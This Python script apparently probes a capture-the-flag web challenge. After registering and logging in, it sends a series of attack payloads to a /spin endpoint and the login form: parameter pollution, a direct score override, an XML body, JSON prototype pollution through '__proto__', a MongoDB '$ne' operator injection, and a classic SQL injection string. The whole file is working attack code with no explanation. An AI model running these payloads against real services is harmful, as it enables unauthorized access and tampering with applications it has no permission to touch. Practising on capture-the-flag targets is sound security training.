import requests, base64, zlib

base = 'https://web-random-cheese.tracebash.xyz'
s = requests.Session()
s.post(f'{base}/register', data={'username':'hacker6000','password':'pass6000'}, allow_redirects=False)
s.post(f'{base}/login', data={'username':'hacker6000','password':'pass6000'}, allow_redirects=False)

# Check if we can manipulate the cookie directly
# Let's try to get the current state from the cookie
cookie = s.cookies.get('session')
print('Current cookie:', cookie[:50])

# Try some interesting parameter attacks
# 1. Use val as array
r = s.post(f'{base}/spin', data={'val[0]': '100', 'val[1]': '100'})
print('Array val:', r.text)

# 2. Try to override score with init/list
r = s.post(f'{base}/spin', data={'score': '85'})
print('Override score:', r.text)

# 3. Try to inject to get score 85 directly
r = s.post(f'{base}/spin', data={'__score': '85'})
print('__score:', r.text)

# 4. Try body as XML
r = s.post(f'{base}/spin', data='<?xml version="1.0"?><spin><val>85</val></spin>', headers={'Content-Type': 'application/xml'})
print('XML:', r.text)

# 5. Send just JSON with different key
r = s.post(f'{base}/spin', json={'__proto__': {'score': 85}})
print('prototype:', r.text)

# 6. Check for MongoDB injection
r = s.post(f'{base}/spin', json={'val': {'$ne': None}})
print('$ne:', r.text)

# 7. Try injecting into username session
r = s.post(f'{base}/login', data={'username': "admin' OR '1'='1", 'password': "admin' OR '1'='1"})
print('SQLi login status:', r.status_code, 'cookie:', s.cookies.get('session') is not None)